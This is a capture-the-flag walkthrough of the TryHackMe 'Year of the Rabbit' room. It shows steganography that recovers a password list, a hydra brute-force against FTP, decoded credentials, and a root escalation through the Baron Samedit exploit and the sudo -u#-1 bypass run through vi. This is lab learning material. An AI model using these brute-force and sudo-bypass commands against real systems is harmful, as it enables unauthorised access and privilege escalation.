#zsteg #sudo-cve

https://tryhackme.com/r/room/yearoftherabbit

---
#### Nmap
![[Screenshot_2024-05-25_11-17-12.png]]
Enum with `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
![[Screenshot_2024-06-12_19-03-52.png]]

In the `style.css` contains a rabbit hole `/sup3r_s3cr3t_fl4g.php` leading on `/intermediary.php?hidden_directory=/WExYY2Cv-qU` leading on the rickroll

When I turn off javascript, the `/sup3r_s3cr3t_fl4g` page tells me
```html
<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
```

But when I'm listening to the video, a voice is telling me it is not in the video

On `/WExYY2Cv-qU`, there is a picture `Hot_Babe.png`

I used [aperisolve.com](https://www.aperisolve.com/) to get information and it may be a bingo
```text
**extradata:**0 .. text: "Ot9RrG7h2~24?\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password:\nMou+56n%QK8sr\n1618B0AUshw1M\nA56IpIl%1s02u\nvTFbDzX9&Nmu?\nFfF~sfu^UQZmT\n8FF?iKO27b~V0\nua4W~2-@y7dE$\n3j39aMQQ7xFXT\nWb4--CTc4ww*-\nu6oY9?nHv84D&\n0iBp4W69Gr_Yf\nTS*%miyPsGV54\nC77O3FIy0c0sd\nO14xEhgg0Hxz1\n5dpv#Pr$wqH7F\n1G8Ucoce1+gS5\n0plnI%f0~Jw71\n0kLoLzfhqq8u&\nkS9pn5yiFGj6d\nzeff4#!b5Ib_n\nrNT4E4SHDGBkl\nKKH5zy23+S0@B\n3r6PHtM4NzJjE\ngm0!!EC1A0I2?\nHPHr!j00RaDEi\n7N+J9BYSp4uaY\nPYKt-ebvtmWoC\n3TN%cD_E6zm*s\neo?@c!ly3&=0Z\nnR8&FXz$ZPelN\neE4Mu53UkKHx#\n86?004F9!o49d\nSNGY0JjA5@0EE\ntrm64++JZ7R6E\n3zJuGL~8KmiK^\nCR-ItthsH%9du\nyP9kft386bB8G\nA-*eE3L@!4W5o\nGoM^$82l&GA5D\n1t$4$g$I+V_BH\n0XxpTd90Vt8OL\nj0CN?Z#8Bp69_\nG#h~9@5E5QA5l\nDRWNM7auXF7@j\nFw!if_=kk7Oqz\n92d5r$uyw!vaE\nc-AA7a2u!W2*?\nzy8z3kBi#2e36\nJ5%2Hn+7I6QLt\ngL$2fmgnq8vI*\nEtb?i?Kj4R=QM\n7CabD7kwY7=ri\n4uaIRX~-cY6K4\nkY1oxscv4EB2d\nk32?3^x1ex7#o\nep4IPQ_=ku@V8\ntQxFJ909rd1y2\n5L6kpPR5E2Msn\n65NX66Wv~oFP2\nLRAQ@zcBphn!1\nV4bt3*58Z32Xe\nki^t!+uqB?DyI\n5iez1wGXKfPKQ\nnJ90XzX&AnF5v\n7EiMd5!r%=18c\nwYyx6Eq-T^9\#@\nyT2o$2exo~UdW\nZuI-8!JyI6iRS\nPTKM6RsLWZ1&^\n3O$oC~%XUlRO@\nKW3fjzWpUGHSW\nnTzl5f=9eS&*W\nWS9x0ZF=x1%8z\nSr4*E4NT5fOhS\nhLR3xQV*gHYuC\n4P3QgF5kflszS\nNIZ2D%d58*v@R\n0rJ7p%6Axm05K\n94rU30Zx45z5c\nVi^Qf+u%0*q_S\n1Fvdp&bNl3#&l\nzLH%Ot0Bw&c%9\n"
```

It is a password list for the `ftpuser`, I asked my assistant GPT4 to format this list
```text
Mou+56n%QK8sr 1618B0AUshw1M A56IpIl%1s02u vTFbDzX9&Nmu? FfF~sfu^UQZmT 8FF?iKO27b~V0 ua4W~2-@y7dE$ 3j39aMQQ7xFXT Wb4--CTc4ww*- u6oY9?nHv84D& 0iBp4W69Gr_Yf TS*%miyPsGV54 C77O3FIy0c0sd O14xEhgg0Hxz1 5dpv#Pr$wqH7F 1G8Ucoce1+gS5 0plnI%f0~Jw71 0kLoLzfhqq8u& kS9pn5yiFGj6d zeff4#!b5Ib_n rNT4E4SHDGBkl KKH5zy23+S0@B 3r6PHtM4NzJjE gm0!!EC1A0I2? HPHr!j00RaDEi 7N+J9BYSp4uaY PYKt-ebvtmWoC 3TN%cD_E6zm*s eo?@c!ly3&=0Z nR8&FXz$ZPelN eE4Mu53UkKHx# 86?004F9!o49d SNGY0JjA5@0EE trm64++JZ7R6E 3zJuGL~8KmiK^ CR-ItthsH%9du yP9kft386bB8G A-*eE3L@!4W5o GoM^$82l&GA5D 1t$4$g$I+V_BH 0XxpTd90Vt8OL j0CN?Z#8Bp69_ G#h~9@5E5QA5l DRWNM7auXF7@j Fw!if_=kk7Oqz 92d5r$uyw!vaE c-AA7a2u!W2*? zy8z3kBi#2e36 J5%2Hn+7I6QLt gL$2fmgnq8vI* Etb?i?Kj4R=QM 7CabD7kwY7=ri 4uaIRX~-cY6K4 kY1oxscv4EB2d k32?3^x1ex7#o ep4IPQ_=ku@V8 tQxFJ909rd1y2 5L6kpPR5E2Msn 65NX66Wv~oFP2 LRAQ@zcBphn!1 V4bt3*58Z32Xe ki^t!+uqB?DyI 5iez1wGXKfPKQ nJ90XzX&AnF5v 7EiMd5!r%=18c wYyx6Eq-T^9#@ yT2o$2exo~UdW ZuI-8!JyI6iRS PTKM6RsLWZ1&^ 3O$oC~%XUlRO@ KW3fjzWpUGHSW nTzl5f=9eS&*W WS9x0ZF=x1%8z Sr4*E4NT5fOhS hLR3xQV*gHYuC 4P3QgF5kflszS NIZ2D%d58*v@R 0rJ7p%6Axm05K 94rU30Zx45z5c Vi^Qf+u%0*q_S 1Fvdp&bNl3#&l zLH%Ot0Bw&c%9
```

Then I used hydra to bruteforce
```shell
hydra -l ftpuser -P passw ftp://10.10.11.140 -t 4
```

![[Screenshot_2024-06-12_19-51-50.png]]

Here are the creds `ftpuser:5iez1wGXKfPKQ`

I found the file `Eli's Creds.txt` containing a ciphered content

Here is the `brainfuck` deciphered result: `eli:DSpDiM1wAEwid`

And here I am in as `eli`

![[Screenshot_2024-06-13_08-35-26.png]]

I've got this message, this maybe be the key to go on `gwendoline`'s account to get the `user.txt`

So I simply used the following command to find the `s3cr3t` place
```shell
find / -name '*s3cr3t*' 2> /dev/null
```

There is a `.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!` file in the `/usr/games/s3cr3t` directory containing `gwendoline`'s password: `MniVCQVhQHUNI`

So the creds are `gwendoline:MniVCQVhQHUNI`

And here I am in as `gwendoline`

The `sudo -l` give me the possibility to use `vi` as any user except root:
![[Screenshot_2024-06-13_09-00-04.png]]

This give me the possibility to switch to every user using the `:shell` command in `vi`

So I used the baron2 cve `exploit_userspec.py` file with
```python
python3 exploit_userspec.py
```

it added a `gg:gg` user in `/etc/shadow`, I just had to `su gg` to become root

The other way was to use the sudo exploit
```shell
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

